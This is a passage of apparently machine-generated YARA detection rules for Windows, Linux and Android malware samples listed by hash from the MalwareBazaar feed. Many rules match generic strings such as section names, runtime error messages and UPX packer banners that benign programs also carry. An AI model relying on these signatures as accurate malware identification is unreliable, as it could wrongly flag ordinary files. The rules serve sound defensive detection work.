        $s6 = "<BindCreateInstance>b__10"
        $s7 = "<DoWriteRawValueAsync>d__120"
        $s8 = "<InternalWriteStartAsync>d__20"
        $s9 = "<GetClsidChildren>d__20"
        $s10 = "<GetEnumerator>d__20"
        $s11 = "<GetFilteredFiles>d__20"
        $s12 = "<GetChildProviders>d__20"
        $s13 = "<WaitForReady>d__20"
        $s14 = "<WriteTokenAsync>d__30"
        $s15 = "<ReadAndParseManifest>d__30"
        $s16 = "<ReadFileFromLocalAsync>d__40"
        $s17 = "<DoReadAsBooleanAsync>d__40"
        $s18 = "get_InvalidServerPath60"
        $s19 = "<ReadFlightsOnce>b__20_0"
        $s20 = "<GetMergedCustomAndManifestActionsInOrder>b__20_0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 12418KB and
        all of them
}

rule Linux_4565415c5ec2829a3259f14537f4a651533c5db25262665c4366833c2a2441f9
{
    meta:
        description = "Auto ML: 4565415c5ec2829a3259f14537f4a651533c5db25262665c4366833c2a2441f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB and
        all of them
}

rule Windows_058dc25297c1b2b8bc2c9d21acef07934f70fc8ae0fa5830c65a7b61eeb4346a
{
    meta:
        description = "Auto ML: 058dc25297c1b2b8bc2c9d21acef07934f70fc8ae0fa5830c65a7b61eeb4346a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6803KB and
        all of them
}

rule Windows_45dfd4cd57257e9fb4b967c4a6bd4059399615cf8ecb39fd692025f4f241c3d5
{
    meta:
        description = "Auto ML: 45dfd4cd57257e9fb4b967c4a6bd4059399615cf8ecb39fd692025f4f241c3d5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "GetString"
        $s7 = "System.IO"
        $s8 = "ModuleHandle"
        $s9 = "System.Collections.Generic"
        $s10 = "WriteLine"
        $s11 = "Thread"
        $s12 = "System.Threading"
        $s13 = "Close"
        $s14 = "ThreadPool"
        $s15 = "QueueUserWorkItem"
        $s16 = "File"
        $s17 = "ReadAllText"
        $s18 = "GetDirectoryName"
        $s19 = "System.Reflection"
        $s20 = "GetExecutingAssembly"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 489KB and
        all of them
}

rule Linux_45f1a4a57738e0da4bd7a846b715c346fedcc68f7b9ddc9a76e78a0ae0d120e6
{
    meta:
        description = "Auto ML: 45f1a4a57738e0da4bd7a846b715c346fedcc68f7b9ddc9a76e78a0ae0d120e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^Nuhttp://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 128KB and
        all of them
}

rule Windows_460be9287a7336de0f0996ef9f6bcedcfb72b693d5d7e8ad38057e64a8ae4f69
{
    meta:
        description = "Auto ML: 460be9287a7336de0f0996ef9f6bcedcfb72b693d5d7e8ad38057e64a8ae4f69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB and
        all of them
}

rule Android_463498837437f9fab4120f2269de1d2029c0362980c42950839da240a7b8f702
{
    meta:
        description = "Auto ML: 463498837437f9fab4120f2269de1d2029c0362980c42950839da240a7b8f702"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/arctic.attheme"
        $s2 = "assets/bluebubbles.attheme"
        $s3 = "assets/countries.txt}X"
        $s4 = "assets/currencies.json"
        $s5 = "assets/darkblue.attheme"
        $s6 = "assets/day.attheme"
        $s7 = "assets/emoji/0_0.png"
        $s8 = "assets/emoji/0_1.png"
        $s9 = "assets/emoji/0_10.png"
        $s10 = "assets/emoji/0_100.png"
        $s11 = "assets/emoji/0_1000.png"
        $s12 = "assets/emoji/0_1001.png"
        $s13 = "assets/emoji/0_1002.png"
        $s14 = "assets/emoji/0_1003.png"
        $s15 = "assets/emoji/0_1004.png"
        $s16 = "assets/emoji/0_1005.png"
        $s17 = "assets/emoji/0_1006.png"
        $s18 = "assets/emoji/0_1007.png"
        $s19 = "assets/emoji/0_1008.png"
        $s20 = "assets/emoji/0_1009.png"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 73740KB and
        all of them
}

rule Linux_46418981d8c7846bc82ac055492dbfd6f30f150c4ffcedd75bd42dbefb2912c1
{
    meta:
        description = "Auto ML: 46418981d8c7846bc82ac055492dbfd6f30f150c4ffcedd75bd42dbefb2912c1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_464b1d4edf0290f166cde4d613e0736ed776bad4b39b48a2e97e3e6c98a6b067
{
    meta:
        description = "Auto ML: 464b1d4edf0290f166cde4d613e0736ed776bad4b39b48a2e97e3e6c98a6b067"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = "CoCreateInstance"
        $s4 = "DeleteUrlCacheEntry"
        $s5 = "ExitProcess"
        $s6 = "GetCommandLineA"
        $s7 = "GetComputerNameA"
        $s8 = "GetCurrentProcessId"
        $s9 = "GetCurrentThreadId"
        $s10 = "GetExitCodeThread"
        $s11 = "GetFileSize"
        $s12 = "GetModuleFileNameA"
        $s13 = "GetModuleHandleA"
        $s14 = "CloseHandle"
        $s15 = "GetProcAddress"
        $s16 = "GetSystemDirectoryA"
        $s17 = "GetTempPathA"
        $s18 = "GetTickCount"
        $s19 = "GetVersion"
        $s20 = "GetVersionExA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB and
        all of them
}

rule Windows_468b604307b567958f106df5a1503da9ce04390eda7c83f67bc38d08a09156f0
{
    meta:
        description = "Auto ML: 468b604307b567958f106df5a1503da9ce04390eda7c83f67bc38d08a09156f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "OCMD])\\\\n7H3bO^Uq"
        $s5 = "OCJWW=Ngi7H8SCLWYlY!%6[DOCMWY(Z=]5[DOCMDi=Xu@7H"
        $s6 = "(OCMDQ.K={"
        $s7 = "rCMD"
        $s8 = "Bec5imes.exe"
        $s9 = "<Module>"
        $s10 = "IVsWebPublishActivityWindow"
        $s11 = "Settings"
        $s12 = "System"
        $s13 = "System.ComponentModel"
        $s14 = "System.Windows.Forms"
        $s15 = "System.Resources"
        $s16 = "System.Globalization"
        $s17 = "IReadOnlyList`1"
        $s18 = "System.Collections.Generic"
        $s19 = "GetWebProjectPublish"
        $s20 = "Microsoft.VisualStudio.Shell.Interop"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 414KB and
        all of them
}

rule Windows_46a740caf7240211b8c2eb2ea95f5a8742a6d9002af7053100f62720aa7e5cbb
{
    meta:
        description = "Auto ML: 46a740caf7240211b8c2eb2ea95f5a8742a6d9002af7053100f62720aa7e5cbb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB and
        all of them
}

rule Windows_46d0ec50967a080bb19f4c7e4939d55753391118c2d55c1b76ae543243bef025
{
    meta:
        description = "Auto ML: 46d0ec50967a080bb19f4c7e4939d55753391118c2d55c1b76ae543243bef025"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3749KB and
        all of them
}

rule Windows_46d5190fd7f6dc29f452951eeeacfff33677d3b620da637b2cba73514b7f1d3c
{
    meta:
        description = "Auto ML: 46d5190fd7f6dc29f452951eeeacfff33677d3b620da637b2cba73514b7f1d3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = "CLRCreateInstance"
        $s17 = "CreateFullTrustSandbox"
        $s18 = ".text$di"
        $s19 = ".text$mn"
        $s20 = ".text$mn$00"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1064KB and
        all of them
}

rule Linux_0597e7607f5c06e8387a3e131e6b21ee6551b1809aac748c7bf4053113cc5a1f
{
    meta:
        description = "Auto ML: 0597e7607f5c06e8387a3e131e6b21ee6551b1809aac748c7bf4053113cc5a1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "processor"
        $s2 = "/sys/devices/system/cpu"
        $s3 = ".text"
        $s4 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Windows_46e646dcfb73f26f153653b020f9871da0dc1bbd39b518e159616e352ebee9fc
{
    meta:
        description = "Auto ML: 46e646dcfb73f26f153653b020f9871da0dc1bbd39b518e159616e352ebee9fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2378KB and
        all of them
}

rule Linux_46e8aaee811d697d728f1d9bc191decac381ed8989aefe0d28a182541e3dbd30
{
    meta:
        description = "Auto ML: 46e8aaee811d697d728f1d9bc191decac381ed8989aefe0d28a182541e3dbd30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB and
        all of them
}

rule Windows_46f0d64ee75053434ba73658a438fd682cada47e1f57a6b67eb52d9815a76f88
{
    meta:
        description = "Auto ML: 46f0d64ee75053434ba73658a438fd682cada47e1f57a6b67eb52d9815a76f88"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "ios_base::badbit set"
        $s6 = "ios_base::failbit set"
        $s7 = "ios_base::eofbit set"
        $s8 = "InterruptDataSets"
        $s9 = "LoadingData"
        $s10 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s11 = "no such process"
        $s12 = "already connected"
        $s13 = "bad file descriptor"
        $s14 = "connection aborted"
        $s15 = "connection already in progress"
        $s16 = "connection refused"
        $s17 = "connection reset"
        $s18 = "file exists"
        $s19 = "file too large"
        $s20 = "filename too long"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1061KB and
        all of them
}

rule Linux_46fc3bea567b436c1b405b6bd68db3dcc3c8108105dbfa100427d54a5bf4e779
{
    meta:
        description = "Auto ML: 46fc3bea567b436c1b405b6bd68db3dcc3c8108105dbfa100427d54a5bf4e779"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 111KB and
        all of them
}

rule Linux_472c671509cfccf01e2978618ef913f527e9889693d6d9901924c7d35a77bc3f
{
    meta:
        description = "Auto ML: 472c671509cfccf01e2978618ef913f527e9889693d6d9901924c7d35a77bc3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Windows_4795b3e74b3a88891cbda6d7cb1ad17fc133266c3c95493ba0726975d9eb0046
{
    meta:
        description = "Auto ML: 4795b3e74b3a88891cbda6d7cb1ad17fc133266c3c95493ba0726975d9eb0046"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 229KB and
        all of them
}

rule Windows_47b406b0d74b00d8a971a1a19c5e8eb0fefda295f946c05dff9e19ba369edaba
{
    meta:
        description = "Auto ML: 47b406b0d74b00d8a971a1a19c5e8eb0fefda295f946c05dff9e19ba369edaba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB and
        all of them
}

rule Windows_47d70838cbedc8b0e0634e51bde8a72035922bddc1177cc9210fa0adb967d6a2
{
    meta:
        description = "Auto ML: 47d70838cbedc8b0e0634e51bde8a72035922bddc1177cc9210fa0adb967d6a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "setybdetL"
        $s7 = "OpenSSL 1.1.1o  3 May 2022"
        $s8 = "c:\\build\\openssl-1.1.1o\\ssl\\packet_local.h"
        $s9 = "application data after close notify"
        $s10 = "attempt to reuse session in different context"
        $s11 = "bad srtp protection profile list"
        $s12 = "bad ssl filetype"
        $s13 = "bad write retry"
        $s14 = "connection type not set"
        $s15 = "custom ext handler already installed"
        $s16 = "dane already enabled"
        $s17 = "empty srtp protection profile list"
        $s18 = "error setting tlsa base domain"
        $s19 = "https proxy request"
        $s20 = "http request"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4659KB and
        all of them
}

rule Windows_47dad8008a4505593c2626d8d1e4489e4626a13d373e749fd231434a10e1ff54
{
    meta:
        description = "Auto ML: 47dad8008a4505593c2626d8d1e4489e4626a13d373e749fd231434a10e1ff54"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4467KB and
        all of them
}

rule Linux_4811bf0aa1b3ed16411d205d67811fa107400c7c50b57cd64b30250204fb3fb9
{
    meta:
        description = "Auto ML: 4811bf0aa1b3ed16411d205d67811fa107400c7c50b57cd64b30250204fb3fb9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 73KB and
        all of them
}

rule Windows_059f60cd43b55dc2cadcd89ea57b8b7c48ca2677e8dea439ac6a7d7b6d9593bb
{
    meta:
        description = "Auto ML: 059f60cd43b55dc2cadcd89ea57b8b7c48ca2677e8dea439ac6a7d7b6d9593bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_ASCII"
        $s6 = "System.Collections.Generic"
        $s7 = "Thread"
        $s8 = "thread"
        $s9 = "Load"
        $s10 = "set_Enabled"
        $s11 = "set_FormattingEnabled"
        $s12 = "get_InvokeRequired"
        $s13 = "get_Connected"
        $s14 = "set_Sorted"
        $s15 = "set_IsBackground"
        $s16 = "CreateInstance"
        $s17 = "set_AutoScaleMode"
        $s18 = "get_BigEndianUnicode"
        $s19 = "get_Message"
        $s20 = "set_ScrollAlwaysVisible"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 619KB and
        all of them
}

rule Windows_4819b02f24cd343be795732e8d3b80c3823fccec1c152aaa4efd4184e1490006
{
    meta:
        description = "Auto ML: 4819b02f24cd343be795732e8d3b80c3823fccec1c152aaa4efd4184e1490006"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Tmluuazh.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "<Module>{8bc097eb-1db2-4a1b-9fdd-8bcfafdae3fc}"
        $s8 = "CreateWorker"
        $s9 = "GetTypeFromHandle"
        $s10 = "CreateDelegate"
        $s11 = "System.Reflection"
        $s12 = "Load"
        $s13 = "GetTypes"
        $s14 = "System.Resources"
        $s15 = "m_Registry"
        $s16 = "System.Globalization"
        $s17 = "get_ResourceManager"
        $s18 = "get_Assembly"
        $s19 = "get_Culture"
        $s20 = "set_Culture"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 684KB and
        all of them
}

rule Windows_486d2fae164dfd24b2d443ffd775d83f33136a746bded12f3e05cade26bacd24
{
    meta:
        description = "Auto ML: 486d2fae164dfd24b2d443ffd775d83f33136a746bded12f3e05cade26bacd24"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "\"BankingSystemSimulation.MainWindow"
        $s6 = "NWindowsBase, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
        $s7 = "9http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        $s8 = "NSystem.Xaml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s9 = "x,http://schemas.microsoft.com/winfx/2006/xaml"
        $s10 = "7System.Windows.Controls.Primitives.DataGridColumnHeader"
        $s11 = "TargetType"
        $s12 = "System.Windows.Controls.DataGrid"
        $s13 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj"
        $s14 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s15 = "System.Drawing.Icon"
        $s16 = "System.Drawing.Size"
        $s17 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s18 = "System.Drawing.Bitmap"
        $s19 = "nDYV.exe"
        $s20 = "System.Security"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 902KB and
        all of them
}

rule Windows_48b0afb9f404d55c311994ab4da41e3aa6dacd23a1b8e0de1addfe6f9fea4d11
{
    meta:
        description = "Auto ML: 48b0afb9f404d55c311994ab4da41e3aa6dacd23a1b8e0de1addfe6f9fea4d11"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "RcCYklOV3r9EqwLZ,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5107KB and
        all of them
}

rule Windows_48e0f13774ec9d2897e8d6192f16f9b9a5688b770959dc5056864c1048e68de5
{
    meta:
        description = "Auto ML: 48e0f13774ec9d2897e8d6192f16f9b9a5688b770959dc5056864c1048e68de5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "ios_base::badbit set"
        $s6 = "ios_base::failbit set"
        $s7 = "ios_base::eofbit set"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 481KB and
        all of them
}

rule Windows_48f9310ae3bd7b1b5ac53aad0ede4db7c136193369d4d2c58cec0f05ddddf84f
{
    meta:
        description = "Auto ML: 48f9310ae3bd7b1b5ac53aad0ede4db7c136193369d4d2c58cec0f05ddddf84f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
